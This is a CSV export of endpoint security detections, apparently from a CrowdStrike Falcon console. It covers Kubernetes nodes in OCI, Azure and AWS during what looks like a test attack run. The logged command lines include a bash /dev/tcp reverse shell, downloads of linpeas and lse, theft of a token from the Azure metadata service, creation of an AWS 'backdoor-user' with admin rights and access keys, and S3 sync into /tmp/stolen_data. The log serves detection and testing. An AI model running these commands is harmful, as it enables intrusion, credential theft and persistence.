Severity,Time,Worker node,Host ID,Host type,Tactic & technique,Detection name,Container ID,File name,File path,Action taken,Environment,Cluster Name,Command line,Detection description,Detection ID,Image ID,Pod name,Namespace
High,2026-03-18T07:01:08Z,oke-cnijw5k4dca-nltgyhwal3a-szct6wufnpq-0,189ec1dbaaf34ac4b5f0e02c54aa63de,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",7ffd688f352c02fee48c0e79ec9d73480ebce687aeb01b73d215e6b0a589268a,bash,/usr/bin/bash,"Detection, process would have been killed if related prevention policy setting was enabled.",OCI,--,"/bin/bash -c 
            exec 5<>/dev/tcp/10.0.4.131/4444;
            cat <&5 | while read line; do $line 2>&5 >&5; done
            ",Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:189ec1dbaaf34ac4b5f0e02c54aa63de:1773817267663346370-30103-1137132304,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:04:26Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Collection via Data from Local System,"[
    ""GenericDataFromLocalSystemCollectionLin""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,dash,/usr/bin/dash,"Detection, process would have been killed if related prevention policy setting was enabled.",AZURE,talon-cdr-aks,/bin/sh ./lse.sh -l 1 -i -c,A process accessed data from the local file system. This might indicate an attempt to steal information. Review the accessed files and process tree.,ind:74a91aaa0ae044b59f188193524ebe70:1773792265715620636-30210-180541456,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:04:26Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Execution via Command and Scripting Interpreter,"[
    ""SuspiciousShellScriptLin""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,wget,/usr/bin/wget,"Detection, standard detection.",AZURE,talon-cdr-aks,wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh,A suspicious shell script was executed. Review the script and process tree.,ind:74a91aaa0ae044b59f188193524ebe70:1773792264744492782-30134-180526864,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:04:25Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Ingress Tool Transfer,"[
    ""CurlWgetMalwareDownload""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,wget,/usr/bin/wget,"Detection, process would have been killed if related prevention policy setting was enabled.",AZURE,talon-cdr-aks,wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh,An attempt to download malicious files from the command-line interface has been detected on your host. Adversaries might use curl or wget to download additional payloads in case of compromise. Please review the event to determine if malicious files were downloaded or if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792265542152547-30126-180525584,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:04:25Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Execution via Command and Scripting Interpreter,"[
    ""ExecutionLin""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,chmod,/usr/bin/chmod,"Detection, standard detection.",AZURE,talon-cdr-aks,chmod +x linpeas.sh lse.sh,The commands executed on this CLI are suspicious and may be related to malicious activity. Review the commands to see if they are expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792265712285332-30113-180526096,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:04:25Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Ingress Tool Transfer,"[
    ""CurlWgetMalwareDownload""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,wget,/usr/bin/wget,"Detection, process would have been killed if related prevention policy setting was enabled.",AZURE,talon-cdr-aks,wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh,An attempt to download malicious files from the command-line interface has been detected on your host. Adversaries might use curl or wget to download additional payloads in case of compromise. Please review the event to determine if malicious files were downloaded or if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792264744492782-30126-180524048,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:03:51Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,env,/usr/bin/env,"Detection, standard detection.",AZURE,talon-cdr-aks,/usr/bin/env bash /usr/bin/az account show --query id -o tsv,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792231155201749-30103-180486160,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:03:49Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,env,/usr/bin/env,"Detection, standard detection.",AZURE,talon-cdr-aks,/usr/bin/env bash /usr/bin/az account show,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792229180323465-30103-180482064,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:03:31Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,curl,/usr/bin/curl,"Detection, standard detection.",AZURE,talon-cdr-aks,curl -s -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792211553024663-30103-180460560,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:03:31Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,env,/usr/bin/env,"Detection, standard detection.",AZURE,talon-cdr-aks,/usr/bin/env bash /usr/bin/az login --identity,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792211582351907-30103-180462352,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:03:31Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,cat,/usr/bin/cat,"Detection, standard detection.",AZURE,talon-cdr-aks,cat /tmp/azure_token.json,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792211578927202-30103-180461840,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:55Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws s3 sync s3://fcs-cnapp-client-data-7pko7aiv /tmp/stolen_data/bucket2/,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792175424503670-30128-26674704,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:47Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws s3 sync s3://fcs-cnapp-bucket /tmp/stolen_data/bucket1/,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792167031966034-30128-26672144,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:43Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws rds describe-db-instances --region us-east-1,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792163629707009-30128-26669584,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:39Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws s3 ls,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792159235140849-30128-26668048,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:35Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws iam create-access-key --user-name backdoor-user,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792154746883357-30128-26666000,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:30Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws iam create-access-key --user-name backdoor-user,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792150257996976-30128-26663952,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:26Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws iam create-access-key --user-name backdoor-user,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792145857864322-30128-26662672,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:21Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws iam create-access-key --user-name backdoor-user,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792141449386721-30128-26660112,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:17Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792137019428717-30128-26658832,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:13Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws iam create-user --user-name backdoor-user,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792132529980084-30128-26656528,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:11Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws sts get-caller-identity,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792127645805896-30128-26647312,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:02:04Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,cat,/usr/bin/cat,"Detection, standard detection.",AZURE,talon-cdr-aks,cat /etc/passwd,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792123952644057-30103-180116240,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:02:04Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,bash,/usr/bin/bash,"Detection, standard detection.",AZURE,talon-cdr-aks,bash crowdstrike_test_high,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792123945240947-30103-180113936,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:02:04Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,netstat,/usr/bin/netstat,"Detection, standard detection.",AZURE,talon-cdr-aks,netstat -anlp,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792123965810375-30103-180117520,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:02:04Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Falcon Overwatch via Malicious Activity,"[
    ""TestTriggerHigh""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,bash,/usr/bin/bash,"Detection, standard detection.",AZURE,talon-cdr-aks,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:74a91aaa0ae044b59f188193524ebe70:1773792123945240947-10304-180114704,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:01:54Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Falcon Overwatch via Malicious Activity,"[
    ""TestTriggerHigh""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:0b396650434e4da1b602560786e397b0:1773792114271245836-10304-26604560,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:01:15Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Falcon Intel via Intelligence Indicator - Domain,"[
    ""IntelDomainHigh""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,ping,/usr/bin/ping,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,ping -c 5 swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:0b396650434e4da1b602560786e397b0:1773792057234268465-4900-26322448,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:01:11Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,apt-get,/usr/bin/apt-get,"Detection, standard detection.",AZURE,talon-cdr-aks,apt-get install -y curl unzip wget dnsutils whois git python3 python3-pip procps net-tools nmap netcat-traditional tcpdump,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792071057158092-30103-179875856,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
